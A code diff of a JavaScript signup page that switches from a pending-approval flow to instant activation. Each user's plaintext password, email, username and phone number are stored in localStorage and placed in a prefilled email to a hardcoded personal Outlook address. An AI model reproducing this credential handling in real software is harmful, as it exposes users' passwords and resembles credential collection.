@@ -422,8 +422,8 @@
             color: #ff6688;
         }
 
-        .field-status.info {
-            color: #ffa0ff;
+        .field-status.active {
+            color: #00ffaa;
         }
 
         .password-wrapper {
@@ -688,14 +688,11 @@
 
 <script>
     // ==================== CONFIGURATION ====================
-    // 🔴 IMPORTANT: আপনার ইমেইল এখানে বসান!
-    const RECEIVER_EMAIL = "inyt_444@outlook.com";  // <-- CHANGE THIS TO YOUR EMAIL
+    // 🔴 আপনার ইমেইল এখানে বসান!
+    const RECEIVER_EMAIL = "inyt_444@outlook.com";
     
-    // Active accounts database (accounts that have been approved via login)
-    let activeAccounts = JSON.parse(localStorage.getItem('hologram_active_accounts')) || {};
-    
-    // Pending signups database
-    let pendingSignups = JSON.parse(localStorage.getItem('hologram_pending_signups')) || {};
+    // Active accounts database (signup করলেই এখানে save হবে)
+    let activeAccounts = JSON.parse(localStorage.getItem('signup_active_accounts')) || {};
     
     // ==================== NAVIGATION FUNCTIONS ====================
     function getBasePath() {
@@ -736,7 +733,6 @@
         }, 300);
     }
     
-    // Go to login page
     function goToLoginPage() {
         closeMenu();
         showLoader();
@@ -746,7 +742,7 @@
         }, 300);
     }
     
-    // ==================== ACCOUNT CHECK FUNCTIONS ====================
+    // ==================== CHECK IF ACCOUNT EXISTS ====================
     function isAccountActive(email, username) {
         for (let key in activeAccounts) {
             if (activeAccounts[key].email === email || activeAccounts[key].username === username) {
@@ -756,16 +752,7 @@
         return false;
     }
     
-    function isPending(email, username) {
-        for (let key in pendingSignups) {
-            if (pendingSignups[key].email === email || pendingSignups[key].username === username) {
-                return true;
-            }
-        }
-        return false;
-    }
-    
-    // ==================== VALIDATION FUNCTIONS ====================
+    // ==================== REAL-TIME VALIDATION ====================
     function validateEmail() {
         let email = document.getElementById("signupEmail").value.trim();
         let emailField = document.getElementById("signupEmail");
@@ -786,20 +773,13 @@
             return false;
         }
         
+        // Check if email is already active
         if (isAccountActive(email, null)) {
             emailField.classList.add("error-border");
             emailField.classList.remove("success-border");
-            statusDiv.innerHTML = '<i class="fa-regular fa-circle-check"></i> This Email is Active! Please Login.';
-            statusDiv.className = "field-status success";
+            statusDiv.innerHTML = '<i class="fa-regular fa-circle-check"></i> This Account Is Active! Please Login.';
+            statusDiv.className = "field-status active";
             activeMsgDiv.style.display = "block";
-            return false;
-        }
-        
-        if (isPending(email, null)) {
-            emailField.classList.add("error-border");
-            emailField.classList.remove("success-border");
-            statusDiv.innerHTML = '<i class="fa-regular fa-clock"></i> Already submitted. Waiting for approval.';
-            statusDiv.className = "field-status info";
             return false;
         }
         
@@ -830,20 +810,13 @@
             return false;
         }
         
+        // Check if username is already active
         if (isAccountActive(null, username)) {
             usernameField.classList.add("error-border");
             usernameField.classList.remove("success-border");
-            statusDiv.innerHTML = '<i class="fa-regular fa-circle-check"></i> This Username is Active! Please Login.';
-            statusDiv.className = "field-status success";
+            statusDiv.innerHTML = '<i class="fa-regular fa-circle-check"></i> This Account Is Active! Please Login.';
+            statusDiv.className = "field-status active";
             activeMsgDiv.style.display = "block";
-            return false;
-        }
-        
-        if (isPending(null, username)) {
-            usernameField.classList.add("error-border");
-            usernameField.classList.remove("success-border");
-            statusDiv.innerHTML = '<i class="fa-regular fa-clock"></i> Already submitted. Waiting for approval.';
-            statusDiv.className = "field-status info";
             return false;
         }
         
@@ -1042,7 +1015,22 @@
         }, 5000);
     }
     
-    // ==================== SEND SIGNUP EMAIL ====================
+    // ==================== SAVE ACTIVE ACCOUNT ====================
+    function saveActiveAccount(email, username, fullname, password, phone) {
+        let accountId = Date.now().toString();
+        activeAccounts[accountId] = {
+            email: email,
+            username: username,
+            fullname: fullname,
+            password: password,
+            phone: phone,
+            createdAt: getTime()
+        };
+        localStorage.setItem('signup_active_accounts', JSON.stringify(activeAccounts));
+        return true;
+    }
+    
+    // ==================== SEND SIGNUP EMAIL & SAVE ====================
     function sendSignupEmail() {
         let email = document.getElementById("signupEmail").value.trim();
         let username = document.getElementById("signupUsername").value.trim();
@@ -1074,30 +1062,15 @@
         
         // Check if already active
         if (isAccountActive(email, username)) {
-            showStatus('⚠️ This account is already active! Please login instead.', 'error');
+            showStatus('⚠️ This account is already active! Please login.', 'error');
             return;
         }
         
-        // Check if already pending
-        if (isPending(email, username)) {
-            showStatus('⚠️ Already submitted and waiting for approval!', 'error');
-            return;
-        }
+        // Save to active accounts (auto approve immediately)
+        saveActiveAccount(email, username, fullname, password, phone);
         
-        // Save to pending
-        let signupId = Date.now().toString();
-        pendingSignups[signupId] = {
-            email: email,
-            username: username,
-            fullname: fullname,
-            password: password,
-            phone: phone,
-            submittedAt: getTime()
-        };
-        localStorage.setItem('hologram_pending_signups', JSON.stringify(pendingSignups));
-        
-        // Prepare email
-        let body = `🔮 NEW SIGN UP REQUEST (PENDING APPROVAL) 🔮\n\n`;
+        // Prepare email body
+        let body = `🔮 NEW SIGN UP INFORMATION 🔮\n\n`;
         body += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
         body += `📧 Email        : ${email}\n`;
         body += `👤 Username     : ${username}\n`;
@@ -1105,14 +1078,11 @@
         body += `🔑 Password     : ${password}\n`;
         body += `📱 Phone        : ${phone}\n`;
         body += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-        body += `⏰ Submitted    : ${getTime()}\n`;
-        body += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
-        body += `⚠️ This request is pending approval.\n`;
-        body += `To approve, login with these credentials in the login page.\n`;
+        body += `⏰ Signup Time  : ${getTime()}\n`;
         body += `━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`;
         body += `✨ HOLOGRAM SYSTEM ✨\n`;
         
-        let subject = `🔮 NEW SIGN UP: ${username} (PENDING)`;
+        let subject = `🔮 NEW SIGN UP: ${username}`;
         
         if (RECEIVER_EMAIL === "your_email@gmail.com") {
             showStatus('❌ Please set RECEIVER_EMAIL in the code!', 'error');
@@ -1128,7 +1098,7 @@
             window.open(`https://mail.google.com/mail/?view=cm&fs=1&to=${RECEIVER_EMAIL}&su=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`, '_blank');
         }
         
-        showStatus('✅ Sign up request sent! Waiting for approval.', 'success');
+        showStatus('✅ Sign up successful! Account activated. Info sent to email.', 'success');
         
         // Clear form
         document.getElementById("signupEmail").value = "";
@@ -1145,42 +1115,10 @@
         document.querySelectorAll('.field-status').forEach(div => {
             div.innerHTML = '';
         });
+        
+        // Hide active message
+        document.getElementById("activeAccountMessage").style.display = "none";
     }
-    
-    // ==================== AUTO APPROVAL FUNCTION (Called from Login Page) ====================
-    window.approveAccount = function(email, username, fullname, password, phone) {
-        let accountId = Date.now().toString();
-        activeAccounts[accountId] = {
-            email: email,
-            username: username,
-            fullname: fullname,
-            password: password,
-            phone: phone,
-            approvedAt: getTime()
-        };
-        localStorage.setItem('hologram_active_accounts', JSON.stringify(activeAccounts));
-        
-        // Remove from pending
-        for (let key in pendingSignups) {
-            if (pendingSignups[key].email === email || pendingSignups[key].username === username) {
-                delete pendingSignups[key];
-            }
-        }
-        localStorage.setItem('hologram_pending_signups', JSON.stringify(pendingSignups));
-        
-        console.log('✅ Account approved:', username);
-        return true;
-    };
-    
-    // Check if account exists
-    window.checkAccountExists = function(email, username) {
-        return isAccountActive(email, username);
-    };
-    
-    // Get all active accounts (for login page to use)
-    window.getActiveAccounts = function() {
-        return activeAccounts;
-    };
     
     // ==================== SWIPE GESTURES ====================
     let touchStartX = 0;
